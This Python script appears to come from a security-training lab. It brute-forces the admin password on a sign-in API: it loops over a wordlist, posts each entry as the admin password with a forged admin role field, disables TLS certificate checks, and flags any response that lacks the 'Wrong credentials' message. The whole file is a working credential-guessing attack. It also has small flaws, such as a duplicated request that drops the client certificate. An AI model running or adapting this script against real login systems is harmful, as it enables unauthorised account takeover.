import requests
import time
import json

# Configuration
TARGET_URL = "https://web0x02.hbtn/api/task3/signin" 
WORDLIST_FILE = "data.txt"
DELAY_SECONDS = 0.5 
EXPECTED_STRING = "Wrong credentials provided!"
CLIENT_CERT = "client.crt" # Path to your certificate
CLIENT_KEY = "/home/kali/Downloads/web0x02.p12"  # Path to your private key


def run_test():
    try:
        with open(WORDLIST_FILE, 'r') as f:
            for line in f:
                payload_part = line.strip()
                if not payload_part:
                    continue

                data = {"username":"admin","password":payload_part,"role":"admin","remember_me":1}


                try:
                    request_args = {
                        "json": data,
                        "verify": False,  # Ignore server SSL errors (self-signed certs)
                    }

                    # If you need to send a client cert, uncomment lines below:
                    if CLIENT_CERT and CLIENT_KEY:
                        request_args["cert"] = (CLIENT_CERT, CLIENT_KEY)

                    # Send request
                    response = requests.post(TARGET_URL, **request_args)

                    response_content = response.text
                    response = requests.post(TARGET_URL, json=data)
                    
                    # We assume status is 200, so we check the text content directly
                    # search_content can be response.text or json.dumps(response.json())
                    response_content = response.text 
                    
                    # Logic: Check if the expected string is NOT in the response
                    if EXPECTED_STRING not in response_content:
                        print(f"[!] ANOMALY FOUND with input: {payload_part}")
                        print(f"    Status: {response.status_code}")
                        print(f"    Response Length: {len(response_content)}")
                        # Optional: Print a snippet of the unexpected response
                        print(f"    Snippet: {response_content[:100]}...") 
                    else:
                        # Standard response received, logging strictly for progress
                        print(f"Standard response for: {payload_part}")

                except requests.exceptions.RequestException as e:
                    print(f"Request failed: {e}")
                except ValueError:
                    # Handles cases where response isn't valid text/JSON if strict parsing is used
                    print(f"Error parsing response for input: {payload_part}")

                time.sleep(DELAY_SECONDS)

    except FileNotFoundError:
        print(f"Error: The file {WORDLIST_FILE} was not found.")

if __name__ == "__main__":
    run_test()
